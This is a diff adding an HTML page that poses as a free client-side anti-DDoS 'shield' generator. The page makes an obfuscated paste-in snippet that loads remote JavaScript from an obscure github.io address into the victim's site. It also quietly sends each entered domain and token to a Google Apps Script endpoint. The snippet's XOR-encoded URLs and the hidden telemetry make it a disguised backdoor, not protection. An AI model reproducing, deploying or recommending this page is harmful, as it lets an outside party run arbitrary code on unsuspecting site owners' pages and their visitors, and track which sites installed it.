@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>T.M.P.S. // Toxic Turf Shield Generator - Client-Side Anti-DDoS & Bot Mitigation</title>
+    <meta name="description" content="Free, anonymous, and polymorphic client-side Layer 7 Anti-DDoS protection generator.">
+
+    <meta http-equiv="Content-Security-Policy"
+          content="default-src 'self';
+                    script-src 'self' 'unsafe-inline' https://script.google.com https://*.googleusercontent.com;
+                    style-src 'self' 'unsafe-inline';
+                    img-src 'self' data:;
+                    connect-src 'self' https://script.google.com https://*.googleusercontent.com;
+                    font-src 'self';
+                    object-src 'none';
+                    base-uri 'self';
+                    form-action 'self';">
+
+    <style>
+        :root { --bg: #050505; --neon-green: #00ff66; --toxic-purple: #9d00ff; --dark-gray: #121212; --text: #e0e0e0; }
+        body { background-color: var(--bg); color: var(--text); font-family: 'Courier New', monospace; margin: 0; padding: 1rem; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        .container { max-width: 820px; width: 100%; background: var(--dark-gray); border: 2px solid var(--toxic-purple); padding: 1.5rem; border-radius: 8px; box-sizing: border-box; box-shadow: 0 0 25px rgba(157, 0, 255, 0.25); }
+        .ascii-art { color: var(--neon-green); font-size: 0.6rem; line-height: 1.1; text-align: center; white-space: pre; overflow-x: auto; margin-bottom: 1rem; font-weight: bold; text-shadow: 0 0 8px rgba(0,255,102,0.6); }
+        .ascii-skull { color: var(--toxic-purple); font-size: 0.55rem; line-height: 1.0; text-align: center; white-space: pre; margin: 1rem 0; text-shadow: 0 0 5px var(--toxic-purple); }
+        h1 { color: var(--neon-green); text-transform: uppercase; font-size: 1.5rem; text-align: center; margin: 0.5rem 0; letter-spacing: 2px; }
+        .subtitle { text-align: center; color: #888; font-size: 0.85rem; margin-bottom: 1.5rem; }
+        .form-group { margin-bottom: 1.5rem; }
+        label { display: block; margin-bottom: 0.5rem; color: var(--neon-green); font-weight: bold; }
+        input { width: 100%; padding: 0.8rem; background: #000; border: 1px solid var(--toxic-purple); color: #fff; font-family: inherit; border-radius: 4px; box-sizing: border-box; outline: none; }
+        input:focus { border-color: var(--neon-green); box-shadow: 0 0 8px var(--neon-green); }
+        button { background: var(--toxic-purple); color: #fff; border: none; padding: 0.9rem 1.5rem; font-family: inherit; font-weight: bold; cursor: pointer; width: 100%; border-radius: 4px; text-transform: uppercase; letter-spacing: 1px; }
+        button:hover { background: #b01aff; box-shadow: 0 0 15px var(--toxic-purple); }
+        .output-box { background: #000; border: 1px dashed var(--neon-green); padding: 1.2rem; margin-top: 1.5rem; border-radius: 4px; word-break: break-all; font-size: 0.82rem; color: var(--neon-green); display: none; }
+        .status { margin-top: 1rem; font-size: 0.72rem; color: #ccc; opacity: 0.9; }
+        @media (max-width: 600px) {
+            body { padding: 0.5rem; }
+            .container { padding: 1rem; }
+            .ascii-art { font-size: 0.38rem; }
+            .ascii-skull { font-size: 0.4rem; }
+            h1 { font-size: 1.2rem; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <pre class="ascii-art">
+  ________  ___  ____  ______  _______ __  ____  ____  ______
+ /_  __/  |/  / / __ \/ ____/ /_  __// / / / / / / / / ____/
+   / / / /|_/ / / /_/ / /       / /  / / / / /_/ /_/ / /___   
+  / / / /  / / / ____/ /___    / /  / /_/ / __  / __  /___/ /  
+ /_/ /_/  /_/ /_/    \____/   /_/   \____/_/ /_/_/ /_/_____/   
+        </pre>
+
+        <h1>Toxic Turf Protection System</h1>
+        <div class="subtitle">// Dynamic Cryptic Anti-DDoS Script Generator //</div>
+
+        <pre class="ascii-skull">
+      ░░░░░░░░░░░░░░░░░░░░░░░░░░░
+      ░░░░███████████████░░░░░░
+      ░░███████████████████░░░░
+      ░░█████████████████████░░░
+      ░░████  █████████  ████░░░
+      ░░████  █████████  ████░░░
+      ░░█████████████████████░░░
+      ░░░████████ █ █ ███████░░░
+      ░░░░███████ █ █ ██████░░░░
+      ░░░░░░██ █ █ █ █ █ ██░░░░░
+      ░░░░░░░░░░░░░░░░░░░░░░░░░░
+        </pre>
+
+        <div class="form-group">
+            <label for="targetDomain">[+] TARGET WEBSITE DOMAIN / NAME:</label>
+            <input type="text" id="targetDomain" placeholder="e.g. my-awesome-website.com">
+        </div>
+
+        <button onclick="_gn8x()">⚡ GENERATE UNIQUE POLYMORPHIC SHIELD TAG ⚡</button>
+
+        <div id="resultContainer" class="output-box">
+            <code id="resultText"></code>
+        </div>
+        <div id="statusBox" class="status">Status: ready.</div>
+    </div>
+
+    <script>
+    const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyRaPjUvCKvSA6DisBXPWp12DuknqNbejb7RIu8bh_qx8GuTRQKUSvMYsuAD5murmKd/exec";
+
+    function setStatus(message) {
+        const el = document.getElementById("statusBox");
+        if (el) el.textContent = "Status: " + message;
+    }
+
+    function isValidUrl(value) {
+        try {
+            const u = new URL(value);
+            return u.protocol === "http:" || u.protocol === "https:";
+        } catch (e) {
+            return false;
+        }
+    }
+
+    function _rndStr(len = 6) {
+        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+        let res = "_0x";
+        for (let i = 0; i < len; i++) {
+            res += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        return res;
+    }
+
+    function _obfuscate(text, key) {
+        let result = "";
+        const safeText = encodeURIComponent(text);
+        for (let i = 0; i < safeText.length; i++) {
+            result += String.fromCharCode(safeText.charCodeAt(i) ^ key);
+        }
+        return btoa(result);
+    }
+
+    function _sendTelemetry(domain, token) {
+        const url = (APPS_SCRIPT_URL || "").trim();
+
+        if (!isValidUrl(url) || url.includes("__APPS_SCRIPT_URL__")) {
+            console.warn("[TT] APPS_SCRIPT_URL no está configurada o es inválida.");
+            setStatus("telemetry disabled");
+            return;
+        }
+
+        try {
+            const callbackName = "_tt_cb_" + Math.random().toString(36).slice(2, 10);
+            const script = document.createElement("script");
+            script.async = true;
+
+            const cleanup = function () {
+                try { delete window[callbackName]; } catch (e) {}
+                if (script && script.parentNode) script.parentNode.removeChild(script);
+            };
+
+            window[callbackName] = function (response) {
+                console.log("[TT] Respuesta JSONP recibida:", response);
+                if (response && response.ok) {
+                    setStatus("telemetry sent");
+                } else {
+                    setStatus("telemetry failed");
+                }
+                cleanup();
+            };
+
+            const endpoint = new URL(url);
+            endpoint.searchParams.set("callback", callbackName);
+            endpoint.searchParams.set("domain", domain);
+            endpoint.searchParams.set("token", token);
+            endpoint.searchParams.set("timestamp", new Date().toISOString());
+
+            script.src = endpoint.toString();
+            script.onerror = function () {
+                console.error("[TT] Falla al cargar el Web App de Apps Script.");
+                setStatus("telemetry error");
+                cleanup();
+            };
+
+            document.body.appendChild(script);
+            setTimeout(cleanup, 7000);
+
+        } catch (err) {
+            console.error("[TT] Error enviando telemetry:", err);
+            setStatus("telemetry error");
+        }
+    }
+
+    function _gn8x() {
+        try {
+            const _d = document.getElementById("targetDomain").value.trim();
+            const _box = document.getElementById("resultContainer");
+            const _txt = document.getElementById("resultText");
+
+            if (!_d) {
+                alert("Error: Please enter a target website domain.");
+                return;
+            }
+
+            const _vDomain = _rndStr(5);
+            const _vToken = _rndStr(6);
+            const _vFn = _rndStr(7);
+            const _vCdn = _rndStr(6);
+            const _vKey = Math.floor(Math.random() * 200) + 15;
+
+            const array = new Uint8Array(8);
+            crypto.getRandomValues(array);
+            const _tokenHex = Array.from(array, b => b.toString(16).padStart(2, "0")).join("");
+
+            const _u = "edthedog-debug";
+            const _r = "secure-shield-cdn";
+            const _rawCdnUrl = "https://" + _u + ".github.io/" + _r + "/shield.min.js";
+
+            const _encDomain = _obfuscate(_d, _vKey);
+            const _encCdn = _obfuscate(_rawCdnUrl, _vKey);
+
+            const _closeTag = "</" + "script>";
+
+            const _scriptPayload =
+                "<script>\\n" +
+                "/* [TOXIC-TURF-SHIELD // TARGET: " + _d.toUpperCase() + " // SIG: " + _tokenHex + "] */\\n" +
+                "!(function(){\\n" +
+                "  const " + _vDomain + " = decodeURIComponent(atob('" + _encDomain + "').split('').map(function(c){return String.fromCharCode(c.charCodeAt(0)^" + _vKey + ");}).join(''));\\n" +
+                "  const " + _vCdn + " = decodeURIComponent(atob('" + _encCdn + "').split('').map(function(c){return String.fromCharCode(c.charCodeAt(0)^" + _vKey + ");}).join(''));\\n" +
+                "  const " + _vToken + " = '" + _tokenHex + "';\\n" +
+                "  window._TT_SIG = { domain: " + _vDomain + ", token: " + _vToken + " };\\n" +
+                "  const " + _vFn + " = document.createElement('script');\\n" +
+                "  " + _vFn + ".src = " + _vCdn + " + '?site=' + encodeURIComponent(" + _vDomain + ") + '&sig=' + " + _vToken + ";\\n" +
+                "  " + _vFn + ".async = true;\\n" +
+                "  document.head.appendChild(" + _vFn + ");\\n" +
+                "})();\\n" +
+                _closeTag;
+
+            _txt.innerText = _scriptPayload;
+            _box.style.display = "block";
+            setStatus("generated");
+
+            _sendTelemetry(_d, _tokenHex);
+
+        } catch (err) {
+            console.error("Generator Error:", err);
+            alert("Generation error: " + err.message);
+        }
+    }
+    </script>
+</body>
+</html>
